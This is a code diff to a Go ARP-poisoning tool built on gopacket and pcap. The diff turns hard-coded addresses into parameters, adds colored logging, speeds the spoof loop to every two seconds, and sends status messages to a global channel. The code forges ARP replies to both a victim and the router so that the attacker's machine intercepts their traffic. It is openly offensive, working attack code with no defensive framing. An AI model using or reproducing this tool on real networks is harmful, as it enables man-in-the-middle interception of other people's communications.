@@ -1,6 +1,7 @@
 package arpPosion
 
 import (
+	"ARTScript_ARP/globalChan"
 	"fmt"
 	"net"
 	"os"
@@ -9,25 +10,25 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"github.com/withmandala/go-log"
 )
 
-func Start_posion2() {
-	device := ""
-	gt := (net.ParseIP(""))[12:]
-	tg := (net.ParseIP(""))[12:]
-	lc := (net.ParseIP(""))[12:]
-	tgm, _ := net.ParseMAC("")
-	gtm, _ := net.ParseMAC("")
-	lcm, _ := net.ParseMAC("")
-	ArpPoison2(device, gtm, gt, lcm, lc, tgm, tg)
+func Start_posion(device, gateway, gateway_mac, local, local_mac string, target net.IP, target_mac net.HardwareAddr) {
+	gt := (net.ParseIP(gateway))[12:]
+	//tg := (net.ParseIP(target))[12:]
+	lc := (net.ParseIP(local))[12:]
+	//tgm, _ := net.ParseMAC(target_mac)
+	gtm, _ := net.ParseMAC(gateway_mac)
+	lcm, _ := net.ParseMAC(local_mac)
+	ArpPoison(device, gtm, gt, lcm, lc, target_mac, target)
 }
 
-func ArpPoison2(device string, routerMac net.HardwareAddr, routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {
-
+func ArpPoison(device string, routerMac net.HardwareAddr, routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {
+	logger := log.New(os.Stderr).WithColor()
 	// Open NIC at layer 2
 	handle, err := pcap.OpenLive(device, 1024, false, pcap.BlockForever)
 	if err != nil {
-		fmt.Println(err)
+		logger.Error(err)
 		os.Exit(1)
 	}
 	defer handle.Close()
@@ -72,13 +73,13 @@ func ArpPoison2(device string, routerMac net.HardwareAddr, routerIP net.IP, loca
 		// serialize the data (serialize PREPENDS the data)
 		err = arpPacket.SerializeTo(buf, opts)
 		if err != nil {
-			fmt.Println(err)
+			logger.Error(err)
 			os.Exit(1)
 		}
 
 		err = ethernetPacket.SerializeTo(buf, opts)
 		if err != nil {
-			fmt.Println(err)
+			logger.Error(err)
 			os.Exit(1)
 		}
 
@@ -114,13 +115,13 @@ func ArpPoison2(device string, routerMac net.HardwareAddr, routerIP net.IP, loca
 		// serialize the data (serialize PREPENDS the data)
 		err = arpPacket.SerializeTo(buf, opts)
 		if err != nil {
-			fmt.Println(err)
+			logger.Error(err)
 			os.Exit(1)
 		}
 
 		err = ethernetPacket.SerializeTo(buf, opts)
 		if err != nil {
-			fmt.Println(err)
+			logger.Error(err)
 			os.Exit(1)
 		}
 
@@ -132,6 +133,14 @@ func ArpPoison2(device string, routerMac net.HardwareAddr, routerIP net.IP, loca
 		/******** end posion arp from router to local ********/
 
 		//Sleep so we don't flood with ARPS
-		time.Sleep(5 * time.Second)
+		//logger.Infof("arp spoof %v : %v", victimIP, victimMac)
+		SendToChannel(fmt.Sprintf("arp spoof %v : %v", victimIP, victimMac))
+		time.Sleep(2 * time.Second)
 	}
+}
+
+func SendToChannel(information string) {
+	abChan := globalChan.GetABGlobalChanString()
+	abChan <- information
+
 }
